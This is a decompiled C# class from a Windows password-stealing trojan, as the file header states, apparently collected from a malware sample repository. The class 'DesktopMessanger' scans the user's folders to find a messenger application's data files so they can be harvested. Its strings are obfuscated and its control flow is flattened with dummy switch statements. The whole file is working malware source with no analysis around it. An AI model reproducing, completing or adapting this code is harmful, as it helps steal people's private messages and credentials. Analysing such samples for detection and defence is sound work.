// Decompiled with JetBrains decompiler
// Type: DesktopMessanger
// Assembly: Ajowans, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: B9451E92-9872-44E9-A53B-32BF899B0E6F
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\HEUR-Trojan-PSW.Win32.Stealer.gen-ca27c07cc9fddcd8bc07b2b9aa3406ab019fb54797bf2163b190217e9c17ce6a.exe

using Ajowans;
using System;
using System.Collections.Generic;
using System.IO;

public class DesktopMessanger : FileScanner
{
  public List<string> PassedPaths { get; set; } = new List<string>();

  public override string GetFolder(Entity16 scannerArg, FileInfo fileInfo)
  {
    char[] pathList1 = new char[TemplateService.RegisterFile(3220)];
    // ISSUE: field reference
    DeviceManager.RegisterFile((Array) pathList1, __fieldref (VectorContext.addressCount));
    string folder = TreeNodeType.RegisterFile(pathList1);
    try
    {
      DirectoryInfo pathList2 = OutlineList.PrintDirectory((object) fileInfo);
      string empty = string.Empty;
      string pathList3 = ConditionStream.RegisterFile((object) pathList2);
      char[] pathList4 = new char[TemplateService.RegisterFile(3224)];
      // ISSUE: field reference
      DeviceManager.RegisterFile((Array) pathList4, __fieldref (VectorContext.generatorCache));
      string generatorCache1 = TreeNodeType.RegisterFile(pathList4);
      if (ResourceType.RegisterFile(pathList3, generatorCache1))
      {
label_2:
        switch (7)
        {
          case 0:
            goto label_2;
          default:
            if (false)
            {
              // ISSUE: method reference
              RuntimeMethodHandle runtimeMethodHandle = __methodref (DesktopMessanger.GetFolder);
            }
            string pathList5 = PcitureSettings.RegisterFile((object) pathList2);
            string[] generatorCache2 = new string[TemplateService.RegisterFile(3228)];
            int index = TemplateService.RegisterFile(3232);
            char[] pathList6 = new char[TemplateService.RegisterFile(3236)];
            // ISSUE: field reference
            DeviceManager.RegisterFile((Array) pathList6, __fieldref (VectorContext.generatorCache));
            string str = TreeNodeType.RegisterFile(pathList6);
            generatorCache2[index] = str;
            int previousHandler = TemplateService.RegisterFile(3240);
            empty = ActionInvoker.RegisterFile((object) pathList5, generatorCache2, (StringSplitOptions) previousHandler)[TemplateService.RegisterFile(3244)];
            break;
        }
      }
      char[] pathList7 = new char[TemplateService.RegisterFile(3248)];
      // ISSUE: field reference
      DeviceManager.RegisterFile((Array) pathList7, __fieldref (VectorContext.previousHandler));
      string pathList8 = TreeNodeType.RegisterFile(pathList7);
      string generatorCache3 = BitmapContext.RegisterFile((object) scannerArg);
      string previousHandler1;
      if (!StreamStream.RegisterFile(empty))
      {
label_7:
        switch (5)
        {
          case 0:
            goto label_7;
          default:
            previousHandler1 = ConfigOptions.RegisterFile(StreamProvider.RegisterFile(792), empty);
            break;
        }
      }
      else
        previousHandler1 = "";
      return DeploymentStack.RegisterFile(pathList8, generatorCache3, previousHandler1);
    }
    catch
    {
    }
    return folder;
  }

  public override IEnumerable<Entity16> GetScanArgs()
  {
    List<Entity16> pathList1 = ConnectionTable.RegisterFile();
    try
    {
      int pathList2 = TemplateService.RegisterFile(3252);
      char[] pathList3 = new char[TemplateService.RegisterFile(3256)];
      // ISSUE: field reference
      DeviceManager.RegisterFile((Array) pathList3, __fieldref (VectorContext.previousHandler));
      string pathList4 = TreeNodeType.RegisterFile(pathList3);
      char[] pathList5 = new char[TemplateService.RegisterFile(3260)];
      // ISSUE: field reference
      DeviceManager.RegisterFile((Array) pathList5, __fieldref (VectorContext.addressCount));
      string generatorCache1 = TreeNodeType.RegisterFile(pathList5);
      using (List<string>.Enumerator pathList6 = OutlineLoader.RegisterFile((object) StreamCollection.RegisterFile(pathList4, generatorCache1)))
      {
        while (SymbolToken.RegisterFile(ref pathList6))
        {
          string pathList7 = SolutionList.RegisterFile(ref pathList6);
          try
          {
            List<Entity16> pathList8 = pathList1;
            Entity16 pathList9 = PluginAttribute.RegisterFile();
            ImageAttribute.RegisterFile((object) pathList9, ClientType.RegisterFile(ref pathList2));
            Entity16 pathList10 = pathList9;
            char[] pathList11 = new char[TemplateService.RegisterFile(3264)];
            pathList11[TemplateService.RegisterFile(3268)] = (char) TemplateService.RegisterFile(3272);
            string generatorCache2 = TreeNodeType.RegisterFile(pathList11);
            ProcessFactory.RegisterFile((object) pathList10, generatorCache2);
            Entity16 pathList12 = pathList9;
            string pathList13 = PcitureSettings.RegisterFile((object) OutlineList.RegisterFile((object) PackageCollection.RegisterFile(pathList7)));
            char[] pathList14 = new char[TemplateService.RegisterFile(3276)];
            // ISSUE: field reference
            DeviceManager.RegisterFile((Array) pathList14, __fieldref (VectorContext.generatorCache));
            string generatorCache3 = TreeNodeType.RegisterFile(pathList14);
            string generatorCache4 = ConfigOptions.RegisterFile(pathList13, generatorCache3);
            Stub.RegisterFile((object) pathList12, generatorCache4);
            ActivitySite.RegisterFile((object) pathList9, TemplateService.RegisterFile(3280) != 0);
            Entity16 generatorCache5 = pathList9;
            TextFileService.RegisterFile((object) pathList8, generatorCache5);
            string pathList15 = PcitureSettings.RegisterFile((object) OutlineList.RegisterFile((object) PackageCollection.RegisterFile(pathList7)));
            char[] pathList16 = new char[TemplateService.RegisterFile(3284)];
            // ISSUE: field reference
            DeviceManager.RegisterFile((Array) pathList16, __fieldref (VectorContext.generatorCache));
            string generatorCache6 = TreeNodeType.RegisterFile(pathList16);
            string[] strArray = ReferenceEditor.RegisterFile(ConfigOptions.RegisterFile(pathList15, generatorCache6));
            for (int index = TemplateService.RegisterFile(3288); index < strArray.Length; index += TemplateService.RegisterFile(3312))
            {
              string str = strArray[index];
              if (DeploymentType.RegisterFile((object) ConditionStream.RegisterFile((object) ActionInfo.RegisterFile(str))) == TemplateService.RegisterFile(3292))
              {
label_6:
                switch (2)
                {
                  case 0:
                    goto label_6;
                  default:
                    if (false)
                    {
                      // ISSUE: method reference
                      RuntimeMethodHandle runtimeMethodHandle = __methodref (DesktopMessanger.GetScanArgs);
                    }
                    List<Entity16> pathList17 = pathList1;
                    Entity16 pathList18 = PluginAttribute.RegisterFile();
                    ImageAttribute.RegisterFile((object) pathList18, ClientType.RegisterFile(ref pathList2));
                    Entity16 pathList19 = pathList18;
                    char[] pathList20 = new char[TemplateService.RegisterFile(3296)];
                    pathList20[TemplateService.RegisterFile(3300)] = (char) TemplateService.RegisterFile(3304);
                    string generatorCache7 = TreeNodeType.RegisterFile(pathList20);
                    ProcessFactory.RegisterFile((object) pathList19, generatorCache7);
                    Stub.RegisterFile((object) pathList18, str);
                    ActivitySite.RegisterFile((object) pathList18, TemplateService.RegisterFile(3308) != 0);
                    Entity16 generatorCache8 = pathList18;
                    TextFileService.RegisterFile((object) pathList17, generatorCache8);
                    continue;
                }
              }
            }
label_12:
            switch (3)
            {
              case 0:
                goto label_12;
              default:
                pathList2 += TemplateService.RegisterFile(3316);
                continue;
            }
          }
          catch (Exception ex)
          {
          }
        }
label_16:
        switch (2)
        {
          case 0:
            goto label_16;
        }
      }
      if (TreeNodeInfo.RegisterFile((object) pathList1) == 0)
      {
label_19:
        switch (6)
        {
          case 0:
            goto label_19;
          default:
            string str1 = ConfigOptions.RegisterFile(ViewSite.RegisterFile((Environment.SpecialFolder) TemplateService.RegisterFile(3320)), PartitionHelper.RegisterFile((object) StreamProvider.RegisterFile(5025), StreamProvider.RegisterFile(88), string.Empty));
            List<Entity16> pathList21 = pathList1;
            Entity16 pathList22 = PluginAttribute.RegisterFile();
            ImageAttribute.RegisterFile((object) pathList22, ClientType.RegisterFile(ref pathList2));
            Entity16 pathList23 = pathList22;
            char[] pathList24 = new char[TemplateService.RegisterFile(3324)];
            pathList24[TemplateService.RegisterFile(3328)] = (char) TemplateService.RegisterFile(3332);
            string generatorCache9 = TreeNodeType.RegisterFile(pathList24);
            ProcessFactory.RegisterFile((object) pathList23, generatorCache9);
            Stub.RegisterFile((object) pathList22, str1);
            ActivitySite.RegisterFile((object) pathList22, TemplateService.RegisterFile(3336) != 0);
            Entity16 generatorCache10 = pathList22;
            TextFileService.RegisterFile((object) pathList21, generatorCache10);
            string[] strArray = ReferenceEditor.RegisterFile(str1);
            for (int index = TemplateService.RegisterFile(3340); index < strArray.Length; index += TemplateService.RegisterFile(3364))
            {
              string str2 = strArray[index];
              if (DeploymentType.RegisterFile((object) ConditionStream.RegisterFile((object) ActionInfo.RegisterFile(str2))) == TemplateService.RegisterFile(3344))
              {
label_22:
                switch (6)
                {
                  case 0:
                    goto label_22;
                  default:
                    List<Entity16> pathList25 = pathList1;
                    Entity16 pathList26 = PluginAttribute.RegisterFile();
                    ImageAttribute.RegisterFile((object) pathList26, ClientType.RegisterFile(ref pathList2));
                    Entity16 pathList27 = pathList26;
                    char[] pathList28 = new char[TemplateService.RegisterFile(3348)];
                    pathList28[TemplateService.RegisterFile(3352)] = (char) TemplateService.RegisterFile(3356);
                    string generatorCache11 = TreeNodeType.RegisterFile(pathList28);
                    ProcessFactory.RegisterFile((object) pathList27, generatorCache11);
                    Stub.RegisterFile((object) pathList26, str2);
                    ActivitySite.RegisterFile((object) pathList26, TemplateService.RegisterFile(3360) != 0);
                    Entity16 generatorCache12 = pathList26;
                    TextFileService.RegisterFile((object) pathList25, generatorCache12);
                    continue;
                }
              }
            }
label_26:
            switch (5)
            {
              case 0:
                goto label_26;
            }
            break;
        }
      }
    }
    catch
    {
    }
    return (IEnumerable<Entity16>) pathList1;
  }
}
